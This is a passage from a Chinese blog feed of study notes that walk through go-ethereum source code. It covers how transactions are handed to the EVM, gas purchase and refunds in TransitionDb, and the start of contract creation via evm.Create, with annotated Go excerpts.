仅仅是为了模拟对字节码的取指令、译码、执行和结果储存返回等操作，这些步骤跟真实物理机器上的概念都很类似。<br />
当然，不管虚拟机怎么实现，最终都还是要依靠物理资源。</p>
<p>如今虚拟机的实现方式有两种，一种就是基于栈的，另一种是基于寄存器的。<br />
基于栈的虚拟机有<code>JVM</code>，<code>CPython</code>等，而基于寄存器的有<code>Dalvik</code>以及<code>Lua5.0</code>。<br />
这两种实现方式虽然机制不同，但最终都要实现：</p>
<ol>
<li class="lvl-3">
<p>从内存中取指令；</p>
</li>
<li class="lvl-3">
<p>译码，将指令转义成特定的操作；</p>
</li>
<li class="lvl-3">
<p>执行，也就是在栈或者寄存器中进行计算；</p>
</li>
<li class="lvl-3">
<p>返回计算结果。</p>
</li>
</ol>
<p>我们这里简单通过一张图回顾上面那个ADD指令的执行，了解一下基于栈的计算如何执行，以便我们能对以太坊EVM的原理有更深的理解。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220722114340.png" alt="20220722114340" /></p>
<p>我们栈上先PUSH了3和4在栈顶，现在当收到ADD指令时，调用<code>opAdd()</code>函数。<br />
先执行<code>x = stack.pop()</code>，将栈顶的3取出并赋值给x，删除栈顶的3，<br />
然后执行<code>y = stack.peek()</code>，取出此时栈顶的4但是不删除。<br />
然后执行<code>y.Add(x,y)</code>得到y==7，再讲7压如栈顶。</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/chaors/Ethereum_read">go-ethereum-read：以太坊源码注释</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/lj900911/article/details/84939308">https://blog.csdn.net/lj900911/article/details/84939308</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
        <tag>BlockChain</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-以太坊源码分析-将交易递交给EVM</title>
    <url>/2022/33963.html</url>
    <content><![CDATA[<h1>处理交易的入口：</h1>
<p>整个evm调用的入口在<code>go-ethereum/core/state_transaction.go</code>中.<br />
<code>ApplyTransaction()</code>就是执行交易的入口，而交易的执行就离不开<code>EVM</code>。<br />
每处理一笔交易，就要创建一个 EVM对象 来执行交易中的数据。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220720154820.png" alt="20220720154820" /></p>
<h1>处理交易流程：</h1>
<h2 id="ApplyTransaction函数">ApplyTransaction函数:</h2>
<p><code>ApplyTransaction()</code>和<code>applyTransaction()</code>函数的主要功能是：将交易转化成Message，创建EVM对象，调用<code>ApplyMessage()</code>执行交易，生成日志对象；</p>
<ol>
<li class="lvl-3">
<p>将交易转换成Message</p>
</li>
<li class="lvl-3">
<p>初始化一个EVM的执行环境</p>
</li>
<li class="lvl-3">
<p>新建 EVM 对象</p>
</li>
<li class="lvl-3">
<p>执行交易，改变stateDB世界状态，然后生成收据</p>
</li>
</ol>
<figure class="highlight go"><figcaption><span>core/state_processor.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ApplyTransaction</span><span class="params">(config *params.ChainConfig, bc ChainContext, author *common.Address, gp *GasPool, statedb *state.StateDB, header *types.Header, tx *types.Transaction, usedGas *<span class="type">uint64</span>, cfg vm.Config)</span></span> (*types.Receipt, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// 转换一个Message对象</span></span><br><span class="line">	msg, err := tx.AsMessage(types.MakeSigner(config, header.Number), header.BaseFee)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Create a new context to be used in the EVM environment</span></span><br><span class="line">	<span class="comment">// 创建要在EVM环境中使用的 区块上下文</span></span><br><span class="line">	blockContext := NewEVMBlockContext(header, bc, author)</span><br><span class="line">	<span class="comment">// 使用区块上下文创建EVM对象</span></span><br><span class="line">	vmenv := vm.NewEVM(blockContext, vm.TxContext&#123;&#125;, statedb, config, cfg)</span><br><span class="line">	<span class="comment">// 调用applyTransaction函数</span></span><br><span class="line">	<span class="keyword">return</span> applyTransaction(msg, config, bc, author, gp, statedb, header.Number, header.Hash(), tx, usedGas, vmenv)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着看<code>applyTransaction()</code>函数</p>
<h3 id="applyTransaction函数">applyTransaction函数:</h3>
<figure class="highlight go"><figcaption><span>core/state_processor.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">applyTransaction</span><span class="params">(msg types.Message, config *params.ChainConfig, bc ChainContext, author *common.Address, gp *GasPool, statedb *state.StateDB, blockNumber *big.Int, blockHash common.Hash, tx *types.Transaction, usedGas *<span class="type">uint64</span>, evm *vm.EVM)</span></span> (*types.Receipt, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// Create a new context to be used in the EVM environment.</span></span><br><span class="line">	<span class="comment">// 创建交易上下文</span></span><br><span class="line">	txContext := NewEVMTxContext(msg)</span><br><span class="line">	evm.Reset(txContext, statedb)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Apply the transaction to the current state (included in the env).</span></span><br><span class="line">	<span class="comment">// 执行交易，获取返回结果</span></span><br><span class="line">	result, err := ApplyMessage(evm, msg, gp)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Update the state with pending changes.</span></span><br><span class="line">	<span class="comment">// 更改stateDB世界状态</span></span><br><span class="line">	<span class="keyword">var</span> root []<span class="type">byte</span></span><br><span class="line">	<span class="comment">// 如果是拜占庭硬分叉，清理世界状态</span></span><br><span class="line">	<span class="keyword">if</span> config.IsByzantium(blockNumber) &#123;</span><br><span class="line">		statedb.Finalise(<span class="literal">true</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// 否则计算状态树根，用于产生收据</span></span><br><span class="line">		root = statedb.IntermediateRoot(config.IsEIP158(blockNumber)).Bytes()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 增加header中的usedGas</span></span><br><span class="line">	*usedGas += result.UsedGas</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Create a new receipt for the transaction, storing the intermediate root and gas used</span></span><br><span class="line">	<span class="comment">// by the tx.</span></span><br><span class="line">	<span class="comment">// 创建用于交易的新收据，在tx中存储root和使用的气体</span></span><br><span class="line">	receipt := &amp;types.Receipt&#123;Type: tx.Type(), PostState: root, CumulativeGasUsed: *usedGas&#125;</span><br><span class="line">	<span class="keyword">if</span> result.Failed() &#123;</span><br><span class="line">		receipt.Status = types.ReceiptStatusFailed</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		receipt.Status = types.ReceiptStatusSuccessful</span><br><span class="line">	&#125;</span><br><span class="line">	receipt.TxHash = tx.Hash()</span><br><span class="line">	receipt.GasUsed = result.UsedGas</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If the transaction created a contract, store the creation address in the receipt.</span></span><br><span class="line">	<span class="comment">// 如果交易创建了一个合约，要把合约地址放在收据里</span></span><br><span class="line">	<span class="keyword">if</span> msg.To() == <span class="literal">nil</span> &#123;</span><br><span class="line">		receipt.ContractAddress = crypto.CreateAddress(evm.TxContext.Origin, tx.Nonce())</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Set the receipt logs and create the bloom filter.</span></span><br><span class="line">	<span class="comment">// 记录收据的信息</span></span><br><span class="line">	receipt.Logs = statedb.GetLogs(tx.Hash(), blockHash)</span><br><span class="line">	receipt.Bloom = types.CreateBloom(types.Receipts&#123;receipt&#125;)</span><br><span class="line">	receipt.BlockHash = blockHash</span><br><span class="line">	receipt.BlockNumber = blockNumber</span><br><span class="line">	receipt.TransactionIndex = <span class="type">uint</span>(statedb.TxIndex())</span><br><span class="line">	<span class="keyword">return</span> receipt, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着看<code>ApplyMessage()</code>函数</p>
<h3 id="ApplyMessage函数">ApplyMessage函数:</h3>
<p>在<code>ApplyMessage()</code>中，首先新建一个交易工作环境，然后紧接着调用<code>TransitionDb()</code>方法：</p>
<figure class="highlight go"><figcaption><span>core/state_transition.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// ApplyMessage returns the bytes returned by any EVM execution (if it took place)...</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ApplyMessage</span><span class="params">(evm *vm.EVM, msg Message, gp *GasPool)</span></span> (*ExecutionResult, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> NewStateTransition(evm, msg, gp).TransitionDb()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="StateTransition-TransitionDb函数">StateTransition.TransitionDb函数:</h2>
<h3 id="StateTransition结构体：">StateTransition结构体：</h3>
<p><code>交易工作环境(StateTransition)</code>的数据结构如下：</p>
<figure class="highlight go"><figcaption><span>core/state_transition.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> StateTransition <span class="keyword">struct</span> &#123;</span><br><span class="line">	gp         *GasPool   <span class="comment">// 区块工作环境中的gas剩余额度，就是header中的gasLimit</span></span><br><span class="line">	msg        Message    <span class="comment">// 交易转化的message</span></span><br><span class="line">	gas        <span class="type">uint64</span>     <span class="comment">// 交易的gas余额，最开始等于initialGas，随着交易执行会递减</span></span><br><span class="line">	gasPrice   *big.Int</span><br><span class="line">	gasFeeCap  *big.Int</span><br><span class="line">	gasTipCap  *big.Int   </span><br><span class="line">	initialGas <span class="type">uint64</span>     <span class="comment">// 初始gas，等于交易的gasLimit</span></span><br><span class="line">	value      *big.Int   <span class="comment">// 交易转账额度</span></span><br><span class="line">	data       []<span class="type">byte</span>     <span class="comment">// 交易的input，如果是合约创建，data就是合约代码</span></span><br><span class="line">	state      vm.StateDB <span class="comment">// 状态树</span></span><br><span class="line">	evm        *vm.EVM    <span class="comment">// evm对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>gp</code>是整个区块所有交易可用的<code>gas</code>，其实就是来自于<code>header</code>的<code>gaslimit</code>，<br />
而<code>header</code>的<code>gasLimit</code>是通过父区块的<code>gasUsed</code>推算出来的。<br />
<code>initialGas</code>是交易的<code>gasLimit</code>，gas是余额（等于<code>initialGas</code>减去交易<code>usedGas</code>）。</p>
<h3 id="TransitionDb函数">TransitionDb函数:</h3>
<p><code>TransitionDb()</code>的主要功能是 初始化交易工作环境，执行交易，然后处理交易执行前后的gas增减。</p>
<ol>
<li class="lvl-3">
<p>前置检查：预先检查<code>nonce</code>和<code>gas</code>值,初始化交易工作环境的gas初始值；</p>
</li>
<li class="lvl-3">
<p>计算并扣除固定gas消耗；</p>
</li>
<li class="lvl-3">
<p>通过比较0地址，判断是否是创建新合约，调用evm创建或执行交易；</p>
</li>
<li class="lvl-3">
<p>奖励旷工：归还剩余的 gas，并将已消耗的 gas 计入矿工账户中</p>
</li>
</ol>
<figure class="highlight go"><figcaption><span>core/state_transition.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// TransitionDb will transition the state by applying the current message and</span></span><br><span class="line"><span class="comment">// returning the evm execution result with following fields.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// - used gas:</span></span><br><span class="line"><span class="comment">//      total gas used (including gas being refunded)</span></span><br><span class="line"><span class="comment">// - returndata:</span></span><br><span class="line"><span class="comment">//      the returned data from evm</span></span><br><span class="line"><span class="comment">// - concrete execution error:</span></span><br><span class="line"><span class="comment">//      various **EVM** error which aborts the execution,</span></span><br><span class="line"><span class="comment">//      e.g. ErrOutOfGas, ErrExecutionReverted</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// However if any consensus issue encountered, return the error directly with</span></span><br><span class="line"><span class="comment">// nil evm execution result.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(st *StateTransition)</span></span> TransitionDb() (*ExecutionResult, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// First check this message satisfies all consensus rules before</span></span><br><span class="line">	<span class="comment">// applying the message. The rules include these clauses</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// 1. the nonce of the message caller is correct  caller的nonce是否正确</span></span><br><span class="line">	<span class="comment">// 2. caller has enough balance to cover transaction fee(gaslimit * gasprice) caller是否有足够的余额来支付交易费(gaslimit + gasprice)</span></span><br><span class="line">	<span class="comment">// 3. the amount of gas required is available in the block 区块里剩余可用gas数量</span></span><br><span class="line">	<span class="comment">// 4. the purchased gas is enough to cover intrinsic usage 购买的gas是否足够支付固定gas消耗量</span></span><br><span class="line">	<span class="comment">// 5. there is no overflow when calculating intrinsic gas 计算固定gas消耗量时有没溢出</span></span><br><span class="line">	<span class="comment">// 6. caller has enough balance to cover asset transfer for **topmost** call caller是否有足够的余额来支付资产的转移</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check clauses 1-3, buy gas if everything is correct</span></span><br><span class="line">	<span class="comment">// 先检查1-3项，然后调用buyGas；</span></span><br><span class="line">	<span class="comment">// buyGas是要从区块的gasPool中取出一定的gas用于执行交易</span></span><br><span class="line">	<span class="keyword">if</span> err := st.preCheck(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> st.evm.Config.Debug &#123;</span><br><span class="line">		st.evm.Config.Tracer.CaptureTxStart(st.initialGas)</span><br><span class="line">		<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			st.evm.Config.Tracer.CaptureTxEnd(st.gas)</span><br><span class="line">		&#125;()</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		msg              = st.msg</span><br><span class="line">		sender           = vm.AccountRef(msg.From())</span><br><span class="line">		rules            = st.evm.ChainConfig().Rules(st.evm.Context.BlockNumber, st.evm.Context.Random != <span class="literal">nil</span>)</span><br><span class="line">		<span class="comment">// 目标地址为0地址，则为创建合约，否则是交易或合约调用</span></span><br><span class="line">		contractCreation = msg.To() == <span class="literal">nil</span></span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check clauses 4-5, subtract intrinsic gas if everything is correct</span></span><br><span class="line">	<span class="comment">// 计算并扣除固定的gas消耗</span></span><br><span class="line">	<span class="comment">// 固定的gas消耗（21000） + 非0值gas + 0值gas</span></span><br><span class="line">	gas, err := IntrinsicGas(st.data, st.msg.AccessList(), contractCreation, rules.IsHomestead, rules.IsIstanbul)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> st.gas &lt; gas &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;%w: have %d, want %d&quot;</span>, ErrIntrinsicGas, st.gas, gas)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 更新剩余的gas值</span></span><br><span class="line">	st.gas -= gas</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check clause 6</span></span><br><span class="line">	<span class="keyword">if</span> msg.Value().Sign() &gt; <span class="number">0</span> &amp;&amp; !st.evm.Context.CanTransfer(st.state, msg.From(), msg.Value()) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;%w: address %v&quot;</span>, ErrInsufficientFundsForTransfer, msg.From().Hex())</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Set up the initial access list.</span></span><br><span class="line">	<span class="keyword">if</span> rules.IsBerlin &#123;</span><br><span class="line">		st.state.PrepareAccessList(msg.From(), msg.To(), vm.ActivePrecompiles(rules), msg.AccessList())</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		ret   []<span class="type">byte</span></span><br><span class="line">		vmerr <span class="type">error</span> <span class="comment">// vm errors do not effect consensus and are therefore not assigned to err</span></span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">if</span> contractCreation &#123;</span><br><span class="line">		<span class="comment">// 如果是创建合约，调用 evm.Create</span></span><br><span class="line">		ret, _, st.gas, vmerr = st.evm.Create(sender, st.data, st.gas, st.value)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Increment the nonce for the next transaction</span></span><br><span class="line">		<span class="comment">// 如果是交易或合约调用，则先设置交易发送方的nonce值+1</span></span><br><span class="line">		st.state.SetNonce(msg.From(), st.state.GetNonce(sender.Address())+<span class="number">1</span>)</span><br><span class="line">		<span class="comment">// 调用 evm.Call 执行交易</span></span><br><span class="line">		ret, st.gas, vmerr = st.evm.Call(sender, st.to(), st.data, st.gas, st.value)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 归还剩余的 gas，并将已消耗的 gas 计入矿工账户中</span></span><br><span class="line">	<span class="keyword">if</span> !rules.IsLondon &#123;</span><br><span class="line">		<span class="comment">// Before EIP-3529: refunds were capped to gasUsed / 2</span></span><br><span class="line">		st.refundGas(params.RefundQuotient)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// After EIP-3529: refunds are capped to gasUsed / 5</span></span><br><span class="line">		st.refundGas(params.RefundQuotientEIP3529)</span><br><span class="line">	&#125;</span><br><span class="line">	effectiveTip := st.gasPrice</span><br><span class="line">	<span class="keyword">if</span> rules.IsLondon &#123;</span><br><span class="line">		effectiveTip = cmath.BigMin(st.gasTipCap, <span class="built_in">new</span>(big.Int).Sub(st.gasFeeCap, st.evm.Context.BaseFee))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> st.evm.Config.NoBaseFee &amp;&amp; st.gasFeeCap.Sign() == <span class="number">0</span> &amp;&amp; st.gasTipCap.Sign() == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="comment">// Skip fee payment when NoBaseFee is set and the fee fields</span></span><br><span class="line">		<span class="comment">// are 0. This avoids a negative effectiveTip being applied to</span></span><br><span class="line">		<span class="comment">// the coinbase when simulating calls.</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fee := <span class="built_in">new</span>(big.Int).SetUint64(st.gasUsed())</span><br><span class="line">		fee.Mul(fee, effectiveTip)</span><br><span class="line">		<span class="comment">// 奖励矿工</span></span><br><span class="line">		st.state.AddBalance(st.evm.Context.Coinbase, fee)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 返回执行结果</span></span><br><span class="line">	<span class="keyword">return</span> &amp;ExecutionResult&#123;</span><br><span class="line">		UsedGas:    st.gasUsed(),</span><br><span class="line">		Err:        vmerr,</span><br><span class="line">		ReturnData: ret,</span><br><span class="line">	&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="preCheck函数">preCheck函数:</h3>
<p>继续分解<code>TransitionDb</code>里的具体实现在交易执行之前，要<code>buyGas()</code>之前，要做一些前置检查<code>preCheck()</code>，主要检查项是：</p>
<ol>
<li class="lvl-3">
<p>caller的nonce是否正确</p>
</li>
<li class="lvl-3">
<p>caller是否有足够的余额来支付交易费(gaslimit + gasprice)</p>
</li>
<li class="lvl-3">
<p>区块里剩余可用gas数量</p>
</li>
</ol>
<h3 id="buyGas函数">buyGas函数:</h3>
<p>前置检查完后，<strong>要从区块的gasPool中取出一定的gas用于执行交易</strong>，即调用<code>buyGas()</code>:</p>
<ol>
<li class="lvl-3">
<p>将initialGas和gas都设置为交易的gasLimit</p>
</li>
<li class="lvl-3">
<p>并从总的gaspool里减去预支的gas（即gasLimit）</p>
</li>
<li class="lvl-3">
<p>交易发起者的账户也要减去相应的价值。</p>
</li>
</ol>
<figure class="highlight go"><figcaption><span>core/state_transition.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(st *StateTransition)</span></span> buyGas() <span class="type">error</span> &#123;</span><br><span class="line">	mgval := <span class="built_in">new</span>(big.Int).SetUint64(st.msg.Gas()) <span class="comment">// 返回pool里剩余的gas</span></span><br><span class="line">	mgval = mgval.Mul(mgval, st.gasPrice) <span class="comment">// Pool gas剩余量 * 交易设的gasPrice</span></span><br><span class="line">	balanceCheck := mgval</span><br><span class="line">	<span class="comment">// gas费上限</span></span><br><span class="line">	<span class="keyword">if</span> st.gasFeeCap != <span class="literal">nil</span> &#123;</span><br><span class="line">		balanceCheck = <span class="built_in">new</span>(big.Int).SetUint64(st.msg.Gas())</span><br><span class="line">		balanceCheck = balanceCheck.Mul(balanceCheck, st.gasFeeCap)</span><br><span class="line">		balanceCheck.Add(balanceCheck, st.value)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> have, want := st.state.GetBalance(st.msg.From()), balanceCheck; have.Cmp(want) &lt; <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%w: address %v have %v want %v&quot;</span>, ErrInsufficientFunds, st.msg.From().Hex(), have, want)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 总的gaspool里减去预支的gas,先扣gasFee,用不完会退款</span></span><br><span class="line">	<span class="keyword">if</span> err := st.gp.SubGas(st.msg.Gas()); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 设置交易工作环境的gas为 交易的gasLimit</span></span><br><span class="line">	st.gas += st.msg.Gas()</span><br><span class="line">	st.initialGas = st.msg.Gas()</span><br><span class="line">	<span class="comment">// 交易发起者的账户也要减去相应的价值</span></span><br><span class="line">	st.state.SubBalance(st.msg.From(), mgval)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>gas使用流程:</p>
<ol>
<li class="lvl-3">
<p>从区块的gasPool中取出一定的gas用于执行交易<code>buyGas()</code></p>
</li>
<li class="lvl-3">
<p>计算并扣除固定的gas消耗<code>IntrinsicGas()</code>（固定的gas消耗（21000） + 非0值gas + 0值gas）</p>
</li>
<li class="lvl-3">
<p>执行交易，获取剩余的gas</p>
</li>
<li class="lvl-3">
<p>归还剩余的 gas <code>refundGas()</code>，并将已消耗的 gas 计入矿工账户中</p>
</li>
</ol>
<h3 id="refundGas函数">refundGas函数:</h3>
<figure class="highlight go"><figcaption><span>/core/state_transition.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(st *StateTransition)</span></span> refundGas(refundQuotient <span class="type">uint64</span>) &#123;</span><br><span class="line">	<span class="comment">// Apply refund counter, capped to a refund quotient</span></span><br><span class="line">	<span class="comment">// refundQuotient退款系数</span></span><br><span class="line">	<span class="comment">// Before EIP-3529: 退款封顶为 gasUsed / 2</span></span><br><span class="line">	<span class="comment">// After EIP-3529: 退款封顶为 gasUsed / 5</span></span><br><span class="line">	refund := st.gasUsed() / refundQuotient</span><br><span class="line">	<span class="keyword">if</span> refund &gt; st.state.GetRefund() &#123;</span><br><span class="line">		refund = st.state.GetRefund()</span><br><span class="line">	&#125;</span><br><span class="line">	st.gas += refund</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Return ETH for remaining gas, exchanged at the original rate.</span></span><br><span class="line">	remaining := <span class="built_in">new</span>(big.Int).Mul(<span class="built_in">new</span>(big.Int).SetUint64(st.gas), st.gasPrice)</span><br><span class="line">	<span class="comment">// 原账户eth余额增加</span></span><br><span class="line">	st.state.AddBalance(st.msg.From(), remaining)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Also return remaining gas to the block gas counter so it is</span></span><br><span class="line">	<span class="comment">// available for the next transaction.</span></span><br><span class="line">	<span class="comment">// 把额度退回gas pool,让别的交易有额度可以使用</span></span><br><span class="line">	st.gp.AddGas(st.gas)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/chaors/Ethereum_read">go-ethereum-read：以太坊源码注释</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/jerrychan807/go-ethereum/blob/master/core/vm/evm.go">https://github.com/jerrychan807/go-ethereum/blob/master/core/vm/evm.go</a></p>
</li>
<li class="lvl-2">
<p><a href="https://willzhuang.github.io/2019/03/20/evm%E4%B9%8B%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">https://willzhuang.github.io/2019/03/20/evm之源码分析/</a></p>
</li>
<li class="lvl-2">
<p><a href="http://yangzhe.me/2019/08/12/ethereum-evm/#%E5%88%9B%E5%BB%BA-evm">http://yangzhe.me/2019/08/12/ethereum-evm/#创建-evm</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/Billy1900/Ethereum-tutorial/blob/master/core-vm%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.md">https://github.com/Billy1900/Ethereum-tutorial/blob/master/core-vm源码分析.md</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/lj900911/article/details/84888688">以太坊源码解读（18）以太坊交易的执行基本流程——将交易递交给EVM</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
        <tag>BlockChain</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-以太坊源码分析-通过EVM创建智能合约-Create()</title>
    <url>/2022/15749.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220720154820.png" alt="20220720154820" /><br />
如图所示，在<code>TransitionDb()</code>函数中，执行交易前，会对交易的目的进行判断。</p>
<figure class="highlight go"><figcaption><span>core/state_transition.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// 0地址为创建合约，否则是交易或合约调用</span></span><br><span class="line">contractCreation = msg.To() == <span class="literal">nil</span></span><br></pre></td></tr></table></figure>
<p>如果交易的接收者为空，则代表此条交易的目的是要创建一条合约，随后调用 <code>evm.Create()</code> 执行相关的功能。<br />
现在我们就来看看<code>evm.Create()</code>方法是如何实现合约的创建的。</p>
<h1>创建合约 evm.Create:</h1>
<p>首先看一看创建一个合约所需要的参数：</p>
<figure class="highlight go"><figcaption><span>core/vm/evm.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// Create creates a new contract using code as deployment code.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(evm *EVM)</span></span> Create(caller ContractRef, code []<span class="type">byte</span>, gas <span class="type">uint64</span>, value *big.Int) (ret []<span class="type">byte</span>, contractAddr common.Address, leftOverGas <span class="type">uint64</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	contractAddr = crypto.CreateAddress(caller.Address(), evm.StateDB.GetNonce(caller.Address()))</span><br><span class="line">	<span class="keyword">return</span> evm.create(caller, &amp;codeAndHash&#123;code: code&#125;, gas, value, contractAddr, CREATE)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>caller</code>：转出方地址</p>
</li>
<li class="lvl-2">
<p><code>code</code>：代码（input）</p>
</li>
<li class="lvl-2">
<p><code>gas</code>：当前交易的剩余gas</p>
</li>
<li class="lvl-2">
<p><code>value</code>：转账额度</p>
</li>
</ul>
<p><code>Create()</code>方法主要操作:</p>
<ol>
<li class="lvl-3">
<p>首先对发送者地址（caller.Address）和账户的nonce进行<code>keccak256</code>计算得到合约地址</p>
</li>
<li class="lvl-3">
<p>然后将合约地址传入<code>create()</code>方法</p>
</li>
<li class="lvl-3">
<p>调用是<code>evm.create()</code> 合约创建的真正函数。</p>
</li>
</ol>
<p><code>create()</code>方法主要操作:</p>
<ol>
<li class="lvl-3">
<p>交易执行前的检查</p>
</li>
<li class="lvl-3">
<p>确保当前要创建的地址在世界状态中没有合约存在，如果存在，直接返回；</p>
</li>
<li class="lvl-3">
<p>在<code>StateDB</code>创建一个新的合约账户，设置新账户为<code>nonce</code>为1；</p>
</li>
<li class="lvl-3">
<p>给新合约账户进行转账</p>
</li>
<li class="lvl-3">
<p>创建一个待执行的合约对象，并在解释器执行合约初始化字节码；</p>
</li>
<li class="lvl-3">
<p>处理返回值,在<code>StateDB</code>存储合约的运行时字节码:</p>
</li>
</ol>
<p>分几个部分看看<code>create()</code>方法的具体实现：</p>
<h2 id="检查1-调用栈深度、用户余额：">检查1-调用栈深度、用户余额：</h2>
<p>首先，在执行交易之前需要进行检查：</p>
<ol>
<li class="lvl-3">
<p>深度判断</p>
</li>
<li class="lvl-3">
<p>余额是否足够；</p>
</li>
</ol>
